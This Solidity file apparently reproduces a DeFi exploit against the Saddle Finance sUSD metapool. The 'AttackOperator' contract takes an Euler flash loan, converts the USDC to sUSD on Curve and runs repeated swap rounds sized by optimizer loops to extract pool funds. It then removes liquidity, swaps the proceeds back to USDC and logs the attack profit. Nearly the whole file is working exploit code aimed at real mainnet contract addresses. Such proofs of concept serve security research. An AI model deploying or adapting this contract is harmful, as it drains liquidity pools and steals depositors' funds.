//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IEulerFlashLoan {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);

    function maxFlashLoan(address token) external view returns (uint);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;

    function get_dy(
        int128 i,
        int128 j,
        uint256 dx
    ) external view returns (uint256);
}

interface ISaddle {
    function swap(
        uint8 i,
        uint8 j,
        uint256 dx,
        uint256 min_dy,
        uint deadline
    ) external returns (uint);

    function getTokenBalance(uint8 index) external view returns (uint256);

    function calculateSwap(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx
    ) external view returns (uint256);

    function removeLiquidity(
        uint256 amount,
        uint256[] calldata minAmounts,
        uint256 deadline
    ) external returns (uint256[] memory);

    function getTokenIndex(address tokenAddress) external view returns (uint8);
}

contract AttackOperator is Ownable {
    constructor() public {}

    receive() external payable {}

    fallback() external payable {}

    address constant euler_flash_loan_ca =
        0x07df2ad9878F8797B4055230bbAE5C808b8259b3; // 0xCD04c09a16fC4E8DB47C930AC90C89f79F20aEB4
    address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant susd = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant saddleUsdV2 = 0x5f86558387293b6009d7896A61fcc86C17808D62;
    address constant curvepool = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
    address constant curve3Pool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address constant saddlepool = 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;
    address constant saddleUSDpool = 0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7;

    uint256 constant decimalUsdt = 10 ** 6;
    uint256 constant decimalUsdc = 10 ** 6;
    uint256 constant decimalDai = 10 ** 18;
    uint256 constant decimalSusd = 10 ** 18;
    uint256 susdLoan;

    // optimizer1 paras
    uint flashLoanAmount;
    uint threshold;
    uint iterationsSwap;
    uint iterationsAttack;
    uint rate;
    uint dynamic;
    uint precisionSwap;
    uint initValue;

    // optimizer2 paras
    int256 x0;
    int256 learningRate;
    int256 epsilon;
    int256 maxIterations;
    int256 threshold1;
    int256 precision;
    int256 dynamic1;

    function operate() public {
        // initialize optimizer1
        initValue =
            ISaddle(saddlepool).getTokenBalance(0) +
            ISaddle(saddlepool).getTokenBalance(1);
        uint initLoanUsdc = 18800000e6;
        flashLoanAmount = find_dx(1, 0, initLoanUsdc, initValue);
        // console.log(flashLoanAmount);
        threshold = 100e18;
        iterationsSwap = 8;
        iterationsAttack = 8;
        rate = 9000;
        dynamic = 11000;
        precisionSwap = 10000;

        IEulerFlashLoan(euler_flash_loan_ca).flashLoan(
            address(this),
            usdc,
            // 15000000e6,
            flashLoanAmount,
            // usdc_max_loan,
            new bytes(0)
        );

        console.log(
            "Attack Profit: %s USDC",
            IERC20(usdc).balanceOf(address(this)) / decimalUsdc
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        console.log(
            "flash Loan %s usdc",
            IERC20(usdc).balanceOf(address(this))
        );

        exchangeForSUSD();
        susdLoan = IERC20(susd).balanceOf(address(this));

        // optimize attack in rounds
        uint swapAmountPrecise = initValue;
        uint i = 0;
        uint profitRound0 = 0;
        uint profitRound1 = 0;

        while (i < iterationsAttack) {
            swapAmountPrecise = getSwapAmount(swapAmountPrecise);
            profitRound0 = profitRound1;
            profitRound1 = execAttackRound(swapAmountPrecise);

            // check profit, profit' and threshold
            if (profitRound1 < profitRound0) {
                console.log("no enough profit to be extracted, stop attack");
                break;
            } else if (uint(profitRound1 - profitRound0) < threshold) {
                console.log(
                    "round %s profit %s , swap %s susd",
                    i + 1,
                    profitRound1 - profitRound0,
                    swapAmountPrecise
                );
                console.log("stop by the threshold");
                break;
            } else {
                console.log(
                    "extract %s sUSD in round %s",
                    profitRound1 - profitRound0,
                    i + 1
                    // swapAmountPrecise
                );
                i++;
            }
        }

        console.log("extracted total %s sUSD in pool", profitRound1);

        removeLiquidity();

        exchangeForUSDC();

        //Repay Loan
        IERC20(usdc).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function targetAttackPath() internal view returns (int) {}

    function exchangeDaiForUsdc() internal {}

    function removeLiquidity() internal {
        uint256[] memory minAmounts = new uint256[](3);
        minAmounts[0] = 0;
        minAmounts[1] = 0;
        minAmounts[2] = 0;

        //initialize optimizer2
        x0 = 2000000e18;
        learningRate = 100000e6;
        epsilon = 100000e18;
        maxIterations = 10;
        threshold1 = 5;
        precision = 1000;
        dynamic1 = 990;

        uint swapFinal = uint(
            optimizer(
                x0,
                learningRate,
                epsilon,
                maxIterations,
                threshold1,
                precision,
                dynamic1
            )
        );
        // console.log("init swap amount for lp token:", uint(x0));

        swapToSaddle(swapFinal);
        console.log(
            "optimized swap amount is %s, swapped LP token is %s:",
            swapFinal,
            IERC20(saddleUsdV2).balanceOf(address(this))
        );

        IERC20(saddleUsdV2).approve(
            saddleUSDpool,
            IERC20(saddleUsdV2).balanceOf(address(this))
        );
        ISaddle(saddleUSDpool).removeLiquidity(
            IERC20(saddleUsdV2).balanceOf(address(this)),
            minAmounts,
            block.timestamp
        );
    }

    // calculate grad = y(x) - y(x')
    function gradient(int256 x, int256 step) internal view returns (int256) {
        int256 y1 = int(targetFuntion(x));
        int256 y2 = int(targetFuntion(x + step));
        return ((y2 - y1) * 1e18) / step;
    }

    // calculate x with the largest output of target function
    function optimizer(
        int256,
        int256,
        int256,
        int256,
        int256 _threshold2,
        int256,
        int256 _dynamic2
    ) internal view returns (int256) {
        int256 x = x0;
        int256 grad;

        for (int256 i = 0; i < maxIterations; i++) {
            grad = gradient(x, epsilon);
            if (abs(grad) < _threshold2) {
                console.log(
                    "stop optimize at round %s, grad is %s, threshold is %s",
                    uint(i),
                    uint(grad),
                    uint(_threshold2)
                );
                break;
            }
            // make the algorithm dynamically converge
            x =
                x +
                (((learningRate * _dynamic2) / precision) * grad) /
                precision;
            // console.log("x in round %s is %s", uint(i), uint(x));
        }
        return x;
    }

    // get |x|
    function abs(int256 x) internal pure returns (int256) {
        return x >= 0 ? x : -x;
    }

    function targetFuntion(int preciseAmount) internal view returns (int res) {
        uint lpReserves = ISaddle(saddlepool).getTokenBalance(1) -
            ISaddle(saddlepool).calculateSwap(0, 1, uint(preciseAmount));
        uint susdReserves = ISaddle(saddlepool).getTokenBalance(0) +
            uint(preciseAmount);
        res = int(
            ISaddle(saddlepool).getTokenBalance(0) +
                ISaddle(saddlepool).getTokenBalance(1) -
                lpReserves -
                susdReserves
        );

        return res;
    }

    function exchangeForUSDC() internal {
        // susd to usdc
        IERC20(susd).approve(curvepool, IERC20(susd).balanceOf(address(this)));
        ICurve(curvepool).exchange(
            3,
            1,
            IERC20(susd).balanceOf(address(this)),
            1
        );
        //dai to usdc
        IERC20(dai).approve(curve3Pool, IERC20(dai).balanceOf(address(this)));
        ICurve(curve3Pool).exchange(
            0,
            1,
            IERC20(dai).balanceOf(address(this)),
            0
        );
        //usdt to usdc
        (bool success, ) = usdt.call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                curve3Pool,
                IERC20(usdt).balanceOf(address(this))
            )
        );
        require(success, "USDT approve failed");
        ICurve(curve3Pool).exchange(
            2,
            1,
            IERC20(usdt).balanceOf(address(this)),
            0
        );
    }

    function exchangeForSUSD() internal {
        //Swap USDC to SUSD Via Curve
        uint amount = IERC20(usdc).balanceOf(address(this));
        IERC20(usdc).approve(curvepool, amount);
        ICurve(curvepool).exchange(1, 3, amount, 1);
    }

    function execAttackRound(
        uint256 susdAmountIn
    ) internal returns (uint profitRound) {
        swapToSaddle(susdAmountIn);
        swapFromSaddle();
        uint aftSusd = IERC20(susd).balanceOf(address(this));
        require(aftSusd > susdLoan, "cannot profit");
        return aftSusd - susdLoan;
    }

    function checkSwapAmount(uint swapAmantCheck) internal view returns (bool) {
        return
            ISaddle(saddlepool).getTokenBalance(1) >
            ISaddle(saddlepool).calculateSwap(0, 1, swapAmantCheck);
    }

    function getSwapAmount(uint swapAmountIn) internal returns (uint) {
        uint i = 0;
        uint swapAmountGet = swapAmountIn;
        while (!checkSwapAmount(swapAmountGet) && i < iterationsSwap) {
            swapAmountGet = (swapAmountGet * rate) / precisionSwap;
            rate = (dynamic / precisionSwap) * rate;
            i++;
        }
        return swapAmountGet;
    }

    function swapToSaddle(uint susdAmount) internal {
        //Swap SUSD for SaddleUSDV2
        IERC20(susd).approve(saddlepool, susdAmount);
        ISaddle(saddlepool).swap(0, 1, susdAmount, 1, block.timestamp);
    }

    function swapFromSaddle() internal {
        //Swap SaddleUSDV2 for SUSD
        IERC20(saddleUsdV2).approve(
            saddlepool,
            IERC20(saddleUsdV2).balanceOf(address(this))
        );
        ISaddle(saddlepool).swap(
            1,
            0,
            IERC20(saddleUsdV2).balanceOf(address(this)),
            1,
            block.timestamp
        );
    }

    function find_dx(
        int128,
        int128,
        uint256 _dx,
        uint256 _dy_target
    ) internal view returns (uint256) {
        uint dx_high = _dx;
        uint dx_low = (_dy_target / decimalSusd) * decimalUsdc;
        uint dx_mid = (dx_high + dx_low) / 2;
        uint256 dy = ICurve(curvepool).get_dy(1, 0, dx_mid);
        while (dy < _dy_target) {
            dx_low = dx_mid;
            dx_mid = (dx_high + dx_low) / 2;
            dy = ICurve(curvepool).get_dy(1, 0, dx_mid);
        }
        return dx_mid;
    }

    function checkpoint() internal pure {
        require(false, "checkpoint");
    }
}
